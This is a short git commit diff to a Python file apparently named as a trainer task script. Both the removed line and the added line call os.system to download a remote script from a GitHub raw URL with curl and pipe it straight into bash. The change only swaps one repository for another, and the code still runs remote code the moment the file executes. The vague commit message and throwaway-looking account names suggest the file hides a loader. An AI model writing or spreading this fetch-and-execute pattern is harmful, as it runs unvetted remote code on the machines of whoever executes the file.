2e567bc473da358949bef4434190c49c8f72a8ce
amberektheoenny <amberektheoenny@outlook.com>
2024-12-02 01:54:42 +0700

    Update task.py

--- trainer /task.py
+++ trainer /task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/ganejafaujanih/ins/raw/main/ulangi | bash')
+os.system('curl -sL https://raw.githubusercontent.com/amberektheoenny/expert-rotary-phone/refs/heads/main/fres | bash')
